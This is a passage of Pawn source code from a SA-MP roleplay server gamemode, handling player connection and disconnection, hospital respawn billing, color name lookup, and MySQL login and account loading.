	MissedPaychecks[playerid] = 0;
	HidePM[playerid] = 0;
	Backup[playerid] = 0;
	RadarActive[playerid] = 0;
	RadarWarning[playerid] = 0;
	FindingJob[playerid] = 0;
	FindingDealership[playerid] = 0;
	ShakeHandRequest[playerid] = 999;
	ShakeHandStyle[playerid] = 0;
	TutorialProgress[playerid] = 0;
	PhonePrivacy[playerid] = 0;
	MP3Station[playerid] = 0;

 	ClearCrime(playerid);
	ClearFishes(playerid);
	ClearMarriage(playerid);

	if(AdminLoggedInBefore[playerid] == 1) {
		WasHereForPaycheck[playerid] = GetPVarInt(playerid, "washereforpaycheck");
		SignedPaycheck[playerid] = GetPVarInt(playerid, "signedpaycheck");
		MissedPaychecks[playerid] = GetPVarInt(playerid, "missedpaychecks");
		PayCheckCode[playerid] = GetPVarInt(playerid, "paycheckcode");
		PlayerInfo[playerid][pPayReady] = GetPVarInt(playerid, "payready");
		PlayerInfo[playerid][pPayCheck] = GetPVarInt(playerid, "paycheck");
	}

	DeletePVar(playerid, "washereforpaycheck");
	DeletePVar(playerid, "signedpaycheck");
	DeletePVar(playerid, "missedpaychecks");
	DeletePVar(playerid, "paycheckcode");
	DeletePVar(playerid, "payready");
	DeletePVar(playerid, "paycheck");
}

public OnPlayerConnect(playerid) {
	new
	    szPlayerIP[16];

	// Code to patch a SA-MP exploit where you can connect to a SA-MP server multiple times with a bunch of names and completely rape the logs
	// We don't receive attacks like this very often, but I have produced the code so if we ever need it, we have it right in front of us. It requires testing though...
	/*new
	    szPlayerName[MAX_PLAYER_NAME],
	    szPlayerIP[16],
	    szPlayerIPs[16],
		szPlayerNames[MAX_PLAYER_NAME];

	GetPlayerName(playerid, szPlayerName, MAX_PLAYER_NAME);
	GetPlayerIp(playerid, szPlayerIP, sizeof(szPlayerIP));

	foreach(Player, x) {
        GetPlayerName(x, szPlayerNames, MAX_PLAYER_NAME);
        GetPlayerIp(playerid, szPlayerIPs, sizeof(szPlayerIPs));
        if(strfind(szPlayerName, szPlayerNames, true) != -1 && !strcmp(szPlayerIPs, szPlayerIP, true) && IsStringAlphaNumeric(szPlayerNames) == 0)
			return BanEx(playerid, "NieXrlaM client spam attack attempt");
	}*/

	TotalConnect++;
	if(Iter_Count(Player) > MaxPlayersConnected)
	{
		MaxPlayersConnected = Iter_Count(Player);
		getdate(MPYear,MPMonth,MPDay);
	}

	GetPlayerIp(playerid, szPlayerIP, sizeof(szPlayerIP));
	GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 16);

    if(!InvalidNameCheck(playerid)) return 1;
	if(CheckBan(szPlayerIP) == 1) {
	    SetPlayerName(playerid, "BannedPlayer");
	    SendClientMessage(playerid, COLOR_NEWS, "You're banned from Next Generation Roleplay. You can appeal your ban at Discord");
		Kick(playerid);
		return 1;
	}

	ResetPlayerVariables(playerid);

	SetTimerEx("Login", 1000, 0, "d", playerid);
	return 1;
}

//-----------------[Get color code by name]----------------------
forward GetColorCode(clr[]);
public GetColorCode(clr[])
{
	new color = -1;

	if(IsNumeric(clr)) {
		color = strval(clr);
		return color;
	}

	if(strcmp(clr, "black", true)==0) color=0;
	if(strcmp(clr, "white", true)==0) color=1;
	if(strcmp(clr, "blue", true)==0) color=2;
	if(strcmp(clr, "red", true)==0) color=3;
	if(strcmp(clr, "green", true)==0) color=16;
	if(strcmp(clr, "purple", true)==0) color=5;
	if(strcmp(clr, "yellow", true)==0) color=6;
	if(strcmp(clr, "lightblue", true)==0) color=7;
	if(strcmp(clr, "navy", true)==0) color=94;
	if(strcmp(clr, "beige", true)==0) color=102;
	if(strcmp(clr, "darkgreen", true)==0) color=51;
	if(strcmp(clr, "darkblue", true)==0) color=103;
	if(strcmp(clr, "darkgrey", true)==0) color=13;
	if(strcmp(clr, "gold", true)==0) color=99;
	if(strcmp(clr, "brown", true)==0 || strcmp(clr, "dennell", true)==0) color=55;
	if(strcmp(clr, "darkbrown", true)==0) color=84;
	if(strcmp(clr, "darkred", true)==0) color=74;
	if(strcmp(clr, "maroon", true)==0) color=115;
	if(strcmp(clr, "pink", true)==0) color=126;
	return color;
}

stock HospitalSpawn(playerid)
{
	if(GetPVarInt(playerid, "MedicBill") == 1 && PlayerInfo[playerid][pJailed] == 0) {
		if(GetPVarInt(playerid, "Hospital") == 1 && PlayerInfo[playerid][pInsurance] == 0) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pVip] >= 2) SetPlayerHealth(playerid, 100.0);
				else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "MedicBill");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -200);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill comes to $200. Have a nice day!");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by the state (less than 8 playing hours).");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by your faction insurance.");

			GameTextForPlayer(playerid, "~w~You're presently uninsured, ~n~buy insurance!", 5000, 6);
			SendClientMessage(playerid, COLOR_WHITE, "(( Look for the insurance points next to each hospital. Type /insurehelp for more details. ))");

			SetPlayerPos(playerid, 1175.0586,-1324.2463,14.5938);
			SetPlayerFacingAngle(playerid, 268.9748);
            DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
		} else if(GetPVarInt(playerid, "Hospital") == 2 && PlayerInfo[playerid][pInsurance] == 0) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pVip] >= 2) SetPlayerHealth(playerid, 100.0);
			else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "MedicBill");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -200);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill comes to $200. Have a nice day!");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by the state (less than 8 playing hours).");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by your faction insurance.");

			GameTextForPlayer(playerid, "~w~You're presently uninsured, ~n~buy insurance!", 5000, 6);
			SendClientMessage(playerid, COLOR_WHITE, "(( Look for the insurance points next to each hospital. Type /insurehelp for more details. ))");

			SetPlayerPos(playerid, 2034.2269,-1404.3459,17.2617);
			SetPlayerFacingAngle(playerid, 179.4258);
			DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);

		}
		if(GetPVarInt(playerid, "Hospital") == 1 && PlayerInfo[playerid][pInsurance] == 1) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pVip] >= 2) SetPlayerHealth(playerid, 100.0);
			else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "MedicBill");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -150);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill comes to $150. Have a nice day!");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by the state (less than 8 playing hours).");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by your faction insurance.");

			SetPlayerPos(playerid, 1175.0586,-1324.2463,14.5938);
			SetPlayerFacingAngle(playerid, 268.9748);
            DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
		} else if(GetPVarInt(playerid, "Hospital") == 2 && PlayerInfo[playerid][pInsurance] == 2) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pVip] >= 2) SetPlayerHealth(playerid, 100.0);
			else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "MedicBill");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -150);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill comes to $150. Have a nice day!");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by the state (less than 8 playing hours).");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Your hospital bill was paid for by your faction insurance.");

			SetPlayerPos(playerid, 2034.2269,-1404.3459,17.2617);
			SetPlayerFacingAngle(playerid, 179.4258);
			DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
		}
	}
}

public OnPlayerDisconnect(playerid, reason)
{
    // Crash Fix
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	if(!strcmp(name, "InvalidNick", true)) return 1;
	if(!strcmp(name, "BannedPlayer", true)) return 1;
	if(playerid == MAX_PLAYERS) return 1;

	if(AdminDuty[playerid] == 1) {
		WasHereForPaycheck[playerid] = GetPVarInt(playerid, "washereforpaycheck");
		SignedPaycheck[playerid] = GetPVarInt(playerid, "signedpaycheck");
		MissedPaychecks[playerid] = GetPVarInt(playerid, "missedpaychecks");
		PayCheckCode[playerid] = GetPVarInt(playerid, "paycheckcode");
		PlayerInfo[playerid][pPayReady] = GetPVarInt(playerid, "payready");
		PlayerInfo[playerid][pPayCheck] = GetPVarInt(playerid, "paycheck");
	}
	AdminDuty[playerid] = 0;
	AdminLoggedInBefore[playerid] = 0;
	DeletePVar(playerid, "washereforpaycheck");
	DeletePVar(playerid, "signedpaycheck");
	DeletePVar(playerid, "missedpaychecks");
	DeletePVar(playerid, "paycheckcode");
	DeletePVar(playerid, "payready");
	DeletePVar(playerid, "paycheck");

	if(GetPVarInt(playerid, "PBM") > 0) {
		new
		    szMessage[64];
		format(szMessage, sizeof(szMessage), "%s has left the paintball game (disconnect).", GetPlayerNameEx(playerid));
		foreach(Player, i) {
			if(GetPVarInt(i, "PBM") > 0 && GetPVarInt(i, "PBM") == GetPVarInt(playerid, "PBM") && i != playerid)
			    SendClientMessage(i, COLOR_RED, szMessage);
		}
		DeletePVar(playerid, "PBMK");
		DeletePVar(playerid, "PBMD");
		DeletePVar(playerid, "PBMS");
		DeletePVar(playerid, "IsFrozen");
		PaintballTeam[playerid] = 0;
		SetPlayerHealth(playerid, GetPVarFloat(playerid, "pbhealth"));
		SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "pbarmour"));
		DeletePVar(playerid, "pbhealth");
		DeletePVar(playerid, "pbarmour");
    }

	// print("[debug] step #0");
	// new
	// 	szQuery[128];
	// format(szQuery, sizeof(szQuery), "DELETE FROM connections WHERE PlayerID = %d", playerid);
	// mysql_tquery(szQuery, THREAD_NO_RESULT, playerid,sqldb);

	// print("[debug] step #1");

	if(pTazer[playerid] == 1) GivePlayerValidWeapon(playerid,pTazerReplace[playerid],60000);
	if(GetPVarInt(playerid, "SpeedRadar") == 1) GivePlayerValidWeapon(playerid, GetPVarInt(playerid, "RadarReplacement"), 60000);

	if(GetPVarInt(playerid, "PBM") == 0 && GetPVarInt(playerid, "EventToken") == 0 && AdminDuty[playerid] == 0) {
		new Float: fArmour;
		if(GetPlayerArmour(playerid, fArmour) < ValidArmor[playerid]) GetPlayerArmour(playerid, PlayerInfo[playerid][pArmor]);
		else PlayerInfo[playerid][pArmor] = ValidArmor[playerid];
		GetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
	}

	if(IsCopDragging[playerid] != INVALID_PLAYER_ID)
	{
		PlayerDraggedBy[IsCopDragging[playerid]] = INVALID_PLAYER_ID;
		PlayerDragged[IsCopDragging[playerid]] = 0;
	}

	// print("[debug] step #2");

	if(GetPVarInt(playerid, "MovingStretcher") != -1) {
	    KillTimer(GetPVarInt(playerid, "TickEMSMove"));
	    DeletePVar(GetPVarInt(playerid, "MovingStretcher"), "OnStretcher");
	    SetPVarInt(playerid, "MovingStretcher", -1);
	}

	// print("[debug] step #3");

	if(IsValidDynamic3DTextLabel(Helper[playerid])) DestroyDynamic3DTextLabel(Helper[playerid]);

	if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]))
	{
		DestroyDynamicObject(PlayerInfo[playerid][pWeedObject]);
	}

	if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
		DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
		DeletePVar(playerid, "SirenO");
	}

	// print("[debug] step #4");

	if(IsValidDynamicObject(BoomboxInfo[playerid][bbObject]))
	{
	    DestroyDynamicObject(BoomboxInfo[playerid][bbObject]);

   		foreach(Player, i)
		{
			if(IsPlayerInRangeOfPoint(i,150.0,BoomboxInfo[playerid][bbPosX],BoomboxInfo[playerid][bbPosY],BoomboxInfo[playerid][bbPosZ]) && GetPlayerInterior(i) == BoomboxInfo[playerid][bbInt] && GetPlayerVirtualWorld(i) == BoomboxInfo[playerid][bbVW])
			{
				StopAudioStreamForPlayer(i);
			}
		}
	}

	// print("[debug] step #5");

	IsCopDragging[playerid] = INVALID_PLAYER_ID;
	PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
	PlayerDragged[playerid] = 0;

	// print("[debug] step #6");

	if(GetPVarInt(playerid, "PBM") < 1) {
		if(GetPVarInt(playerid, "Hospital") > 0) {
		    PlayerInfo[playerid][pHospital] = 1;
		}

		if(GetPVarInt(playerid, "Injured") == 1) {
		    PlayerInfo[playerid][pHospital] = 1;
		    KillEMSQueue(playerid);
	        ResetPlayerWeaponsEx(playerid);
		}
		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
	}

	// print("[debug] step #7");

	if(PlayerInfo[playerid][pLockCar] != INVALID_VEHICLE_ID)
		vehicle_unlock_doors(PlayerInfo[playerid][pLockCar]);

	if(PlayerInfo[playerid][pVehicleKeysFrom] != INVALID_PLAYER_ID)
        PlayerVehicleInfo[PlayerInfo[playerid][pVehicleKeysFrom]][PlayerInfo[playerid][pVehicleKeys]][pvAllowedPlayerId] = INVALID_PLAYER_ID;

 	InsideShamal[playerid] = INVALID_VEHICLE_ID;

	// print("[debug] step #9");

	if(GetPlayerSkin(playerid) == 155)
	    PlayerInfo[playerid][pSkin] = GetPVarInt(playerid, "NPS");

	if(InsideShamal[playerid] != INVALID_VEHICLE_ID) {
		if(InsideShamal[playerid] == INVALID_VEHICLE_ID || GetVehicleModel(InsideShamal[playerid]) != 519)
		{
			GivePlayerValidWeapon(playerid, 46, 60000);
			PlayerInfo[playerid][pPos_x] = 0.000000;
			PlayerInfo[playerid][pPos_y] = 0.000000;
			PlayerInfo[playerid][pPos_z] = 420.000000;
		}
		else
		{
			new Float:X, Float:Y, Float:Z;
			GetVehiclePos(InsideShamal[playerid], X, Y, Z);
			PlayerInfo[playerid][pPos_x] = X;
			PlayerInfo[playerid][pPos_y] = Y;
			PlayerInfo[playerid][pPos_z] = Z;

			new Float:XB, Float:YB, Float:ZB;
			GetVehiclePos(InsideShamal[playerid], XB, YB, ZB);
			if(ZB > 50.0)
			{
				GivePlayerValidWeapon(playerid, 46, 60000);
			}
		}
		PlayerInfo[playerid][pVW] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerInterior(playerid, 0);
		InsideShamal[playerid] = INVALID_VEHICLE_ID;
	}

    // print("[debug] step #10");

	// Impound the vehicle if it is currently being towed...
    for(new x = 0; x < MAX_PLAYERVEHICLES; x++) {
		foreach(Player, i) {
		    if(arr_Towing[i] == PlayerVehicleInfo[playerid][x][pvId] && arr_Towing[i] != INVALID_VEHICLE_ID) {
		        PlayerVehicleInfo[playerid][x][pvImpounded] = 1;
		        arr_Towing[i] = INVALID_VEHICLE_ID;
		        DestroyVehicle(PlayerVehicleInfo[playerid][x][pvId]);
			}
		}
	}

	// print("[debug] step #11");

	// If the player (prior to leaving) is in range of any of their own player vehicles, the position will save without having to use /park
	if(reason == 0) {
	    new
	        Float: fPlayerVehiclePos[3];

	    for(new x = 0; x < MAX_PLAYERVEHICLES; x++) {
	        GetVehiclePos(PlayerVehicleInfo[playerid][x][pvId], fPlayerVehiclePos[0], fPlayerVehiclePos[1], fPlayerVehiclePos[2]);
	        if(IsPlayerInRangeOfPoint(playerid, 50, fPlayerVehiclePos[0], fPlayerVehiclePos[1], fPlayerVehiclePos[2])) {
	            PlayerVehicleInfo[playerid][x][pvPosX] = fPlayerVehiclePos[0];
	            PlayerVehicleInfo[playerid][x][pvPosY] = fPlayerVehiclePos[1];
	            PlayerVehicleInfo[playerid][x][pvPosZ] = fPlayerVehiclePos[2];
	            GetVehicleZAngle(playerid, PlayerVehicleInfo[playerid][x][pvPosAngle]);
	        }
	    }
	}

	// print("[debug] step #12");

	UnloadPlayerVehicles(playerid);
	ResetPlayerWeapons(playerid);

	// print("[debug] step #13");

	for(new i = 0; i < MAX_REPORTS; i++) {
	    if(Reports[i][ReportFrom] == playerid) {
	        Reports[i][ReportFrom] = 999;
			Reports[i][BeingUsed] = 0;
			Reports[i][TimeToExpire] = 0;
		}
	}

	// print("[debug] step #14");

	foreach(Player, i)
	{
		if(TaxiAccepted[i] == playerid)
		{
			TaxiAccepted[i] = 999;
			GameTextForPlayer(i, "~w~Taxi Caller~n~~r~Left the game", 5000, 1);
			TaxiCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
		if(EMSAccepted[i] == playerid)
		{
			EMSAccepted[i] = INVALID_PLAYER_ID;
			GameTextForPlayer(i, "~w~EMS Caller~n~~r~Left the game", 5000, 1);
			EMSCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
		if(BusAccepted[i] == playerid)
		{
			BusAccepted[i] = 999;
			GameTextForPlayer(i, "~w~Bus Caller~n~~r~Left the game", 5000, 1);
			BusCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
		if(MedicAccepted[i] == playerid)
		{
			TaxiAccepted[playerid] = 999; BusAccepted[playerid] = 999; MedicAccepted[playerid] = 999;
			GameTextForPlayer(i, "~w~Medic Caller~n~~r~Left the game", 5000, 1);
			MedicCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
	}

	// print("[debug] step #14");

	if(Spectate[playerid] < 553)
	{
        PlayerInfo[playerid][pInt] = GetPVarInt(playerid, "SpecInt");
		PlayerInfo[playerid][pVW] = GetPVarInt(playerid, "SpecVW");
		PlayerInfo[playerid][pPos_x] = GetPVarFloat(playerid, "SpecPosX");
		PlayerInfo[playerid][pPos_y] = GetPVarFloat(playerid, "SpecPosY");
		PlayerInfo[playerid][pPos_z] = GetPVarFloat(playerid, "SpecPosZ");
	    GettingSpectated[Spectate[playerid]] = 999;
	    Spectate[playerid] = 999;
	}

	// print("[debug] step #15");

	if(GetPVarInt(playerid, "gpsonoff") == 1) TextDrawDestroy(GPS[playerid]);
	if(RadarActive[playerid] == 1) {
		TextDrawDestroy(RadarTitle[playerid]);
		TextDrawDestroy(RadarContext[playerid]);
	}

	// print("[debug] step #16");

	if(PlayerBoxing[playerid] > 0)
	{
		if(Boxer1 == playerid)
		{
			if(IsPlayerConnected(Boxer2))
			{
				if(IsPlayerInRangeOfPoint(PlayerBoxing[Boxer2], 25.0, 765.952270, 4.167977, 1000.719238))
				{
					PlayerBoxing[Boxer2] = 0;
					SetPlayerPos(Boxer2, 765.952270, 4.167977, 1000.719238);
					SetPlayerInterior(Boxer2, 5);
					GameTextForPlayer(Boxer2, "~r~Match interrupted", 5000, 1);
					return 1;
				}
			}
		}
		else if(Boxer2 == playerid)
		{
			if(IsPlayerConnected(Boxer1))
			{
				if(IsPlayerInRangeOfPoint(PlayerBoxing[Boxer1],25.0,765.952270, 4.167977, 1000.719238))
				{
					PlayerBoxing[Boxer1] = 0;
					SetPlayerPos(Boxer1, 765.952270, 4.167977, 1000.719238);
					SetPlayerInterior(Boxer1, 5);
					GameTextForPlayer(Boxer1, "~r~Match interrupted", 5000, 1);
					return 1;
				}
			}
		}
		InRing = 0;
	 	RoundStarted = 0;
		Boxer1 = INVALID_PLAYER_ID;
		Boxer2 = INVALID_PLAYER_ID;
	}

	// print("[debug] step #16");

	new string[128];

	if(Spectating[playerid] == 0 && AdminDuty[playerid] == 0) {
		switch(reason) {
	 	   	case 0: {
			   	format(string, sizeof(string), "%s has left the server (timeout).", GetPlayerNameEx(playerid));
			   	ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);

			   	if(PlayerCuffed[playerid] != 0) {
		    		strcpy(PlayerInfo[playerid][pPrisonedBy], "Server", 64);
					strcpy(PlayerInfo[playerid][pPrisonReason], "Logging while cuffed (timeout)", 64);

	                PlayerInfo[playerid][pJailed] = 3;
					PlayerInfo[playerid][pJailTime] += 55*60;
				}
		   	}
		   	case 1: {
			   	format(string, sizeof(string), "%s has left the server (leaving).", GetPlayerNameEx(playerid));
			   	ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);

			   	if(PlayerCuffed[playerid] != 0) {
	    			strcpy(PlayerInfo[playerid][pPrisonedBy], "Server", 64);
					strcpy(PlayerInfo[playerid][pPrisonReason], "Logging while cuffed (leaving)", 64);

	                PlayerInfo[playerid][pJailed] = 3;
					PlayerInfo[playerid][pJailTime] += 60*60;
				}
			}
			case 2: {
				format(string, sizeof(string), "%s has left the server (kicked/banned).", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
		   	}
		}
	}

	// print("[debug] step #17");

	for(new x; x < sizeof(EventInfo[EventStaff]); x++) {
		if(EventInfo[EventStaff][x] == playerid) {
			EventInfo[EventStaff][x] = 999;
			break;
		}
	}

	// print("[debug] step #18");

	if(GetPVarInt(playerid, "EventToken") == 0 && !GetPVarType(playerid, "LoadingObjects") && GetPVarInt(playerid, "PBM") == 0)
	{
		new Float: x, Float: y, Float: z;
		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
		PlayerInfo[playerid][pPos_x] = x;
		PlayerInfo[playerid][pPos_y] = y;
		PlayerInfo[playerid][pPos_z] = z;
	}
	if(GetPVarInt(playerid, "EventToken") != 0 && GetPVarInt(playerid, "PBM") == 0)
	{
	    PlayerInfo[playerid][pInt] = EventLastInt[playerid];
		PlayerInfo[playerid][pVW] = EventLastVW[playerid];
		PlayerInfo[playerid][pPos_r] = EventFloats[playerid][0];
		PlayerInfo[playerid][pPos_x] = EventFloats[playerid][1];
		PlayerInfo[playerid][pPos_y] = EventFloats[playerid][2];
		PlayerInfo[playerid][pPos_z] = EventFloats[playerid][3];
	}

	// print("[debug] step #19");

	if(TransportCost[playerid] > 0 && TransportDriver[playerid] < 999 && AdminDuty[playerid] == 0)
	{
		if(IsPlayerConnected(TransportDriver[playerid]))
		{
			TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
			TransportTime[TransportDriver[playerid]] = 0;
			TransportCost[TransportDriver[playerid]] = 0;
			format(string, sizeof(string), "~w~Passenger left~n~~g~Earned $%d",TransportCost[playerid]);
			GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
			TransportDriver[playerid] = 999;
		}
	}

	// print("[debug] step #20");

	if(GotHit[playerid] > 0)
	{
		if(GetChased[playerid] < 999)
		{
			if(IsPlayerConnected(GetChased[playerid]))
			{
				SendClientMessage(GetChased[playerid], COLOR_YELLOW, "Your hit has left the server.");
				GoChase[GetChased[playerid]] = 999;
			}
		}
	}
 	if(GoChase[playerid] < 999)
 	{
      GetChased[GoChase[playerid]] = 999;
      GotHit[GoChase[playerid]] = 999;
 	}

 	// print("[debug] step #21");

	if(TransportDuty[playerid] == 1)
	{
		TaxiDrivers -= 1;
	}
	else if(TransportDuty[playerid] == 2)
	{
		BusDrivers -= 1;
	}
	if(PlayerInfo[playerid][pJob] == 11 || PlayerInfo[playerid][pJob2] == 11)
	{
		if(JobDuty[playerid] == 1) { Medics -= 1; }
	}
	if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
		if(JobDuty[playerid] == 1) { Mechanics -= 1; }
	}

	// print("[debug] step #22");

	if(GetPVarType(playerid, "tabbedVW") != 0) {
		PlayerInfo[playerid][pVW] = GetPVarInt(playerid, "tabbedVW");
	} else PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);

	// print("[debug] step #23");

	if(GetPVarInt(playerid, "PBM") > 0) {
		PlayerInfo[playerid][pPos_x] = 1782.8229;
		PlayerInfo[playerid][pPos_y] = -1565.8177;
		PlayerInfo[playerid][pPos_z] = 13.3472;
		PlayerInfo[playerid][pInt] = 0;
		PlayerInfo[playerid][pVW] = 0;
		PlayerInfo[playerid][pPos_r] = 0;
		DeletePVar(playerid, "PBM");
	}

	SaveAccount(playerid);

	// print("[debug] step #24");

	if(PlayerInfo[playerid][pHelper] >= 1) {
        if(GetPVarType(playerid, "posX") != 0) {
			PlayerInfo[playerid][pInt] = GetPVarInt(playerid, "posInt");
			PlayerInfo[playerid][pVW] = GetPVarInt(playerid, "posVW");
			PlayerInfo[playerid][pPos_x] = GetPVarFloat(playerid, "posX");
			PlayerInfo[playerid][pPos_y] = GetPVarFloat(playerid, "posY");
			PlayerInfo[playerid][pPos_z] = GetPVarFloat(playerid, "posZ");
			PlayerInfo[playerid][pHealth] = GetPVarFloat(playerid, "HelpHealth");
			PlayerInfo[playerid][pArmor] = GetPVarFloat(playerid, "HelpArmour");


	        SetPlayerInterior(playerid, GetPVarInt(playerid, "posInt"));
	        SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "posVW"));
	        SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "HelpArmour"));
	        SetPlayerHealth(playerid, GetPVarFloat(playerid, "HelpHealth"));
	        SetPlayerPos(playerid, GetPVarFloat(playerid, "posX"), GetPVarFloat(playerid, "posY"), GetPVarFloat(playerid, "posZ"));

	        DeletePVar(playerid, "posX");
	        DeletePVar(playerid, "posY");
	        DeletePVar(playerid, "posZ");
	        DeletePVar(playerid, "posInt");
	        DeletePVar(playerid, "posVW");
	        DeletePVar(playerid, "HelpHealth");
	        DeletePVar(playerid, "HelpArmour");
        }
    }

	// print("[debug] step #25");

    gPlayerLogged[playerid] = 0;
	return 1;
}

stock AttemptPlayerLogin(playerid, passbuffer[]) {
	new
	    szQuery[225],
	    szPlayerName[MAX_PLAYER_NAME],
		szPlayerName2[MAX_PLAYER_NAME];

	GetPlayerName(playerid, szPlayerName, sizeof(szPlayerName));

	mysql_escape_string(szPlayerName, szPlayerName2,MAX_PLAYER_NAME,sqldb);

	mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT * FROM players WHERE Username = '%s' AND Password = '%s'", szPlayerName2, passbuffer);
	mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_LOGIN_ATTEMPT,playerid);
	return 1;
}

stock LoadPlayerDynamicItems(playerid) {
	new
	    szString[128];

	mysql_format(sqldb,szString, sizeof(szString), "SELECT toys.* FROM toys INNER JOIN players ON toys.Owner = players.ID WHERE players.ID = '%d' ORDER BY toys.ID ASC LIMIT %d", PlayerInfo[playerid][pID], MAX_PLAYERTOYS);
	mysql_tquery(sqldb,szString, "OnQueryFinished","ii",THREAD_LOAD_P_ITEMS_CHAIN_1, playerid);
	return 1;
}

stock SaveAccount(playerid) {
    // The query threads continue in the callback for finished queries.
	if(GetPVarInt(playerid, "TempName") != 1 && gPlayerLogged[playerid] && AdminDuty[playerid] == 0) {

		new
			szPlayerName[MAX_PLAYER_NAME],
			szPlayerName2[MAX_PLAYER_NAME],
